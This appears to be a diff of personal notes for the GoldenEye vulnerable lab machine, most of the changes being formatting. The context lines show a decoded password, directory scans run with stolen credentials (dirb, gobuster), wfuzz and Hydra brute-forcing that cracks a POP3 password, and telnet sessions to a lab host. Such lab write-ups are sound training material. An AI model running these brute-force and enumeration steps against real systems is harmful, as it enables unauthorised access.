@@ -124,13 +124,19 @@ for e in s:
 # InvincibleHack3r
 ```
 ### bash
+
 ```bash
 # for d in $(echo -n '&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;' | tr -d '&#' | tr ';' '\n'); do printf \\$(printf "%o" $d); done && echo
 InvincibleHack3r
 
+```
 
+
+
+# Scan dir
+
+```bash
 $ dirb  http://192.168.110.8/sev-home/ -u boris:InvincibleHack3r -X .php
-
 gobuster dir -u http://192.168.110.8/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
 
 $ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.110.8/sev-home --hc 401
@@ -166,7 +172,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:10:
 [55006][pop3] host: 192.168.110.8   login: boris   password: secret1!
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:13:11
- 
 
 
                         
@@ -208,7 +213,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:16:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:07
 
-
+ 
+```
 
 ┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
 └─$ telnet 192.168.110.8 55007
@@ -276,7 +282,7 @@ PS - Keep security tight or we will be compromised.
 
 .
 
-└─$ telnet 192.168.110.8 55007                                                        1 ⨯
+└─$ telnet 192.168.110.8 55007
 Trying 192.168.110.8...
 Connected to 192.168.110.8.
 Escape character is '^]'.
